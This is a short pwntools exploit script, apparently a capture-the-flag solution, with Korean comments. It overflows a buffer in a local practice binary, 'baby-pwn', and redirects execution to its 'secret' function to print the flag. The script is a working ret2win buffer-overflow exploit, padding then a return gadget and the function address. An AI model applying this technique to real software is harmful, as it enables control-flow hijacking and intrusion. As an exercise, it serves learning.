from pwn import *

p=process('./baby-pwn')

#Goal
#secret 함수에서 execve()를 통해 flag를 출력시키는 것을 찾음
#해당 함수를 호출시키는 것이 목표

#Vulnerability
#vulnerable_function함수에서 buffer변수 크기보다 더 많은 길이를 입력받는 버퍼오버플로우를  발견

#Exploitation

secret=0x0000000000401166
payload=b'A'*0x40 + b'B'*8
payload += p64(0x000000000040101a)
payload+=p64(secret)

pause()
p.sendline(payload)




p.interactive()
